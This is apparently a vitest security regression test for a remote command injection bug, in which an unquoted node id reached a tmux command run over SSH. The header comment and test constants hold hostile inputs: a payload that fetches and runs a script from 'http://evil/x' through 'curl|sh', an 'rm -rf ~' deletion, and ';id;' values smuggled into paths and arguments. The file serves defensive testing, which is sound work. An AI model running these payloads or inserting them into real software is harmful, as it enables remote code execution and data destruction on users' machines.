import { describe, expect, it } from 'vitest'
import { remoteHookEnvArgs, remoteTmuxPtyArgs } from './control-master'
import { accountTmuxEnvArgs } from '../claude-accounts-core'

/**
 * SECURITY REGRESSION TEST — remote command injection through a node id.
 *
 * `remoteTmuxPtyArgs` builds ONE SHELL LINE that `ssh -t` hands to the remote user's login shell.
 * Everything in it is `posixQuote`d except, until this fix, the `extraEnv` `-e KEY=VALUE` pairs,
 * which carry the RAW React Flow node id (`remoteHookEnvArgs` → `NODETERM_NODE_ID=<id>`) and the
 * managed-account config dir. A node id lives in `.nodeterm/project.json`, a file that travels in
 * a cloned/shared repo and is written on remote hosts — i.e. it is attacker-supplied data. The
 * proven payload was:
 *
 *   tmux -L nodeterm-rmt new-session -A -e NODETERM_HOOK_ENDPOINT=/ep \
 *     -e NODETERM_NODE_ID=n1;curl${IFS}http://evil/x|sh;# … -s 'nt-n1' -c '/home/u'
 *
 * where the `;` ends the tmux command and the rest runs as the SSH user the moment the victim
 * opens that node. The LOCAL path was never exposed: it spawns tmux with an argv array, and
 * `sessionName()` sanitises the session name to `[A-Za-z0-9_-]` anyway.
 *
 * The assertion is therefore about SHELL STRUCTURE, not about a substring: parse the line the way
 * `sh` would and require that (a) no metacharacter survives outside single quotes and (b) the whole
 * payload lands as ONE literal argv element. Delete the quoting in `remoteTmuxPtyArgs` and both
 * halves fail.
 */

/** Every character that is command STRUCTURE to a POSIX shell when it appears unquoted. */
const META = '|&;<>()$`"\n\r*?[]{}!#~\\'

/**
 * Parse a remote command line the way `sh` would: single quotes are literal, whitespace splits
 * words. Returns the resulting argv plus every metacharacter that survived OUTSIDE single quotes —
 * a non-empty `unquotedMeta` means the line carries shell structure the caller did not intend.
 */
function shellParse(cmd: string): { argv: string[]; unquotedMeta: string[] } {
  const argv: string[] = []
  const unquotedMeta: string[] = []
  let cur = ''
  let started = false
  let inQuote = false
  const flush = (): void => {
    if (started) argv.push(cur)
    cur = ''
    started = false
  }
  for (let i = 0; i < cmd.length; i++) {
    const ch = cmd[i]
    if (inQuote) {
      // Inside '…' every byte is literal, including metacharacters, until the closing quote.
      if (ch === "'") inQuote = false
      else cur += ch
      continue
    }
    if (ch === "'") {
      inQuote = true
      started = true
      continue
    }
    // A backslash OUTSIDE quotes escapes the next byte — it is how `posixQuote` re-enters a single
    // quote (`'\''`), so it is data, not structure, and must not be counted as a metacharacter.
    if (ch === '\\' && i + 1 < cmd.length) {
      cur += cmd[++i]
      started = true
      continue
    }
    if (ch === ' ' || ch === '\t') {
      flush()
      continue
    }
    if (META.includes(ch)) unquotedMeta.push(ch)
    cur += ch
    started = true
  }
  flush()
  return { argv, unquotedMeta }
}

const conn = { host: 'h.example.com', user: 'deploy', port: 2222, identityFile: '/k/id' }

/**
 * Every shell escape an attacker gets from a project.json node id, in one string.
 *
 * `$'`, `` $` ``, `$&` and `$$` are here for a SECOND reason and must not be dropped: they are
 * `String.prototype.replace` REPLACEMENT PATTERNS. The first version of this fix quoted correctly
 * and then passed the quoted string as `replace`'s string argument, where `$'` expands to the text
 * FOLLOWING the match — splicing `-s '<session>' -c '<cwd>' …` inside the token and inverting its
 * quote parity. Quoting is not enough on its own; how the quoted bytes are spliced matters too.
 */
const PAYLOAD =
  "n1;curl${IFS}http://evil/x|sh;#`id`$(id)&&rm -rf ~\nwhoami\r'quote'\"dq\"$'$`$&$$"

/**
 * Values that land AFTER the `-e` pairs in the built line — the region a replacement-pattern
 * escape would drag inside the quotes. They are hostile ON PURPOSE and must stay that way: pinning
 * them benign is exactly what let the `$'` defect pass a green suite. All three come from the same
 * `.nodeterm/project.json` as the node id.
 */
const HOSTILE_CWD = '/srv/app;id;#'
const HOSTILE_PROGRAM_ARGS = ['--resume', 'sess;id;#']

describe('remoteTmuxPtyArgs: an attacker-controlled node id is DATA, never command structure', () => {
  it('the parser itself sees structure in an UNQUOTED payload (guards the assertion)', () => {
    // Without this the test could pass because the parser is blind rather than because the code
    // quotes. Feed it the pre-fix shape by hand and require it to notice.
    const bad = shellParse(`tmux new-session -A -e NODETERM_NODE_ID=${PAYLOAD} -s 'nt-n1'`)
    expect(bad.unquotedMeta.length).toBeGreaterThan(0)
  })

  it('splices the hook env pairs as literal single arguments (node id payload and all)', () => {
    const args = remoteTmuxPtyArgs(
      conn,
      '/s.sock',
      'nt-n1',
      HOSTILE_CWD,
      'claude',
      HOSTILE_PROGRAM_ARGS,
      remoteHookEnvArgs('/home/u/.nodeterm/hook-endpoint-p1.env', PAYLOAD, '1', 'claude'),
      '/home/u/.nodeterm/tmux.conf'
    )
    const cmd = args[args.length - 1]
    const { argv, unquotedMeta } = shellParse(cmd)
    // (a) nothing in the line is command structure any more.
    expect(unquotedMeta).toEqual([])
    // (b) the payload is ONE argument, verbatim — tmux gets it as an env value, sh never sees it.
    expect(argv).toContain(`NODETERM_NODE_ID=${PAYLOAD}`)
    // (c) the region AFTER the splice is intact too: a replacement-pattern escape (`$'`) would
    // have dragged these inside the quotes and turned their `;` into command structure.
    expect(argv).toContain(HOSTILE_CWD)
    expect(argv).toContain('sess;id;#')
    // and the command is still exactly one tmux invocation with the expected shape.
    expect(argv.slice(0, 3)).toEqual(['tmux', '-L', 'nodeterm-rmt'])
    expect(argv.filter((a) => a === 'new-session')).toHaveLength(1)
    expect(argv).toContain('nt-n1')
  })

  it("an agent id carrying a $' replacement pattern cannot invert the rest of the line", () => {
    // The exact reviewer PoC shape: the NODE ID is legitimate, the escape rides another
    // project.json field (`node.data.agentId`) into the same splice.
    const args = remoteTmuxPtyArgs(
      conn,
      '/s.sock',
      'nt-term-mabc-3',
      HOSTILE_CWD,
      undefined,
      undefined,
      remoteHookEnvArgs('/home/u/.nodeterm/hook-endpoint-p1.env', 'term-mabc-3', '1', "claude$'"),
      '/home/u/.nodeterm/tmux.conf'
    )
    const { argv, unquotedMeta } = shellParse(args[args.length - 1])
    expect(unquotedMeta).toEqual([])
    expect(argv).toContain("NODETERM_AGENT_ID=claude$'")
    expect(argv).toContain(HOSTILE_CWD)
  })

  it('quotes the managed-account CLAUDE_CONFIG_DIR pair too (same splice, same file provenance)', () => {
    // `accountId` and the remote `$HOME` both reach this splice; neither is quoted by its producer.
    const args = remoteTmuxPtyArgs(conn, '/s.sock', 'nt-n1', '/home/u', undefined, undefined, [
      ...accountTmuxEnvArgs('/home/u/.nodeterm/claude-accounts/a;id;b')
    ])
    const { argv, unquotedMeta } = shellParse(args[args.length - 1])
    expect(unquotedMeta).toEqual([])
    expect(argv).toContain('CLAUDE_CONFIG_DIR=/home/u/.nodeterm/claude-accounts/a;id;b')
  })

  it('leaves a benign node id readable in the argv (the quoting is not lossy)', () => {
    const args = remoteTmuxPtyArgs(conn, '/s.sock', 'nt-term-1', '/srv/app', undefined, undefined, [
      '-e',
      'NODETERM_HOOK_ENDPOINT=/home/u/.nodeterm/hook-endpoint-p1.env',
      '-e',
      'NODETERM_NODE_ID=term-mabc-3'
    ])
    const { argv } = shellParse(args[args.length - 1])
    expect(argv).toContain('-e')
    expect(argv).toContain('NODETERM_NODE_ID=term-mabc-3')
    expect(argv).toContain('NODETERM_HOOK_ENDPOINT=/home/u/.nodeterm/hook-endpoint-p1.env')
    // The `-e` pairs still sit between `-A` and `-s`, where tmux requires them.
    const i = argv.indexOf('-A')
    const s = argv.indexOf('-s')
    expect(argv.indexOf('NODETERM_NODE_ID=term-mabc-3')).toBeGreaterThan(i)
    expect(argv.indexOf('NODETERM_NODE_ID=term-mabc-3')).toBeLessThan(s)
  })
})
